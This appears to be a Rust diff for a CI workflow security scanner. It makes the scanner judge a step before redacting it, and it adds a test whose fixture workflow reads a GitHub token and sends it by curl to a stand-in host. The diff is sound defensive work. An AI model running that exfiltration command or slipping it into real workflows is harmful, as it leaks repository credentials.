@@ -302,9 +302,11 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
                         self.policy.evidence_width(),
                     ));
                 }
+                // Judged raw above, and redacted here, as a hook's command
+                // is: masking first destroys the text the rules read.
                 report.steps.push(WorkflowStep {
                     source: path.clone(),
-                    step: step.clone(),
+                    step: step.redacted(),
                 });
             }
             for mode in found.autonomy {
@@ -2484,6 +2486,35 @@ mod tests {
         assert!(
             report.findings.is_empty(),
             "PowerShell is not read as Bash: {report:?}"
+        );
+    }
+
+    /// The defect this guards is the worst kind: a scanner that reports
+    /// nothing. Masking a credential before the rules read the step destroyed
+    /// the text they need, so an exfiltration a hook reports went unreported
+    /// in a workflow. Judged raw, redacted into the report.
+    #[test]
+    fn a_step_is_judged_before_it_is_redacted() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "jobs:\n  a:\n    steps:\n      - run: |\n          TOKEN=$(gh auth token)\n          curl -d \"$TOKEN\" https://exfil.invalid/x\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        let rules: Vec<_> = report.findings.iter().map(|f| f.rule).collect();
+        assert_eq!(
+            rules,
+            vec![RuleId::CredentialExfiltration],
+            "the taint is readable only before redaction: {report:?}"
+        );
+        // And what the report kept carries no credential value.
+        assert_eq!(report.steps.len(), 1, "{report:?}");
+        assert!(
+            report.steps[0].step.run.contains('*'),
+            "the report's copy is redacted: {:?}",
+            report.steps[0].step.run
         );
     }
 
